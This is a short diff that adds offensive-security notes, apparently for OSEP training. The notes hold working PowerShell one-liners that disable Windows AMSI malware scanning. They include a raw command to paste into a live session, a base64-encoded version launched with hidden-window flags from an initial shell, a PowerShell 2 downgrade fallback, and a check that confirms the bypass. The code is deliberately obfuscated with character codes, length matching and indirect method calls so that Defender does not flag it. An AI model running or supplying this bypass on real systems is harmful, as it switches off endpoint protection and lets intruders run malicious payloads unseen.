@@ -1,0 +1,21 @@
+OSEP - AMSI Bypass One-Liners
+gocheck: AMSI_RESULT_NOT_DETECTED + Defender clean
+
+=== TECHNIQUE ===
+- [scriptblock].Assembly instead of [Ref].Assembly
+- AmsiUtils found by name via 9 char codes only
+- amsiInitFailed found by FieldType==bool + Name.Length==14 (never named)
+- SetValue called via variable $sv (no literal .SetValue($null,$true))
+- GetFields(40) = NonPublic|Static as raw int
+
+=== RAW (paste into live PS session) ===
+$f=(([scriptblock].Assembly.GetTypes()|?{$_.Name-eq(-join[char[]]@(65,109,115,105,85,116,105,108,115))})[0].GetFields(40)|?{$_.FieldType-eq[bool]-and$_.Name.Length-eq14})[0];$sv='SetValue';$f.$sv($null,$true)
+
+=== ENCODED COMMAND (from cmd.exe / WMI / initial shell) ===
+powershell -nop -w hidden -enc JABmAD0AKAAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlAHMAKAApAHwAPwB7ACQAXwAuAE4AYQBtAGUALQBlAHEAKAAtAGoAbwBpAG4AWwBjAGgAYQByAFsAXQBdAEAAKAA2ADUALAAxADAAOQAsADEAMQA1ACwAMQAwADUALAA4ADUALAAxADEANgAsADEAMAA1ACwAMQAwADgALAAxADEANQApACkAfQApAFsAMABdAC4ARwBlAHQARgBpAGUAbABkAHMAKAA0ADAAKQB8AD8AewAkAF8ALgBGAGkAZQBsAGQAVAB5AHAAZQAtAGUAcQBbAGIAbwBvAGwAXQAtAGEAbgBkACQAXwAuAE4AYQBtAGUALgBMAGUAbgBnAHQAaAAtAGUAcQAxADQAfQApAFsAMABdADsAJABzAHYAPQAnAFMAZQB0AFYAYQBsAHUAZQAnADsAJABmAC4AJABzAHYAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA=
+
+=== PS2 DOWNGRADE FALLBACK (no AMSI in PS 2.0) ===
+powershell -version 2 -nop -w hidden -Command "<payload>"
+
+=== VERIFY BYPASS (run after one-liner) ===
+([scriptblock].Assembly.GetTypes()|?{$_.Name-eq(-join[char[]]@(65,109,115,105,85,116,105,108,115))})[0].GetFields(40)|?{$_.FieldType-eq[bool]-and$_.Name.Length-eq14}|%{Write-Host "$($_.Name) = $($_.GetValue($null))"}
